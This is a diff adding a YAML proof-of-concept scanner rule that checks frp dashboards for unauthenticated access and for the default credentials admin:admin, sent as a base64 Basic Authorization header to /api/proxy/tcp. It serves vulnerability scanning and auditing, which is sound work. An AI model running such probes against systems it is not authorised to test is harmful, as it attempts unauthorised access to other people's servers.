@@ -1,0 +1,29 @@
+name: poc-yaml-frp-dashboard-unauth
+manual: true
+transport: http
+rules:
+    defaultpassword0:
+        request:
+            cache: true
+            method: GET
+            path: /api/proxy/tcp
+            follow_redirects: false
+        expression: response.status == 401 && response.body.bcontains(b"Unauthorized")
+    defaultpassword1:
+        request:
+            cache: true
+            method: GET
+            path: /api/proxy/tcp
+            headers:
+                Authorization: Basic YWRtaW46YWRtaW4=
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("text/plain") && response.body.bcontains(b"proxies")
+    unauth0:
+        request:
+            cache: true
+            method: GET
+            path: /api/proxy/tcp
+            follow_redirects: true
+        expression: response.status == 200 && response.content_type.contains("text/plain") && response.body.bcontains(b"proxies")
+expression: unauth0() || defaultpassword0() && defaultpassword1()
+detail: {}
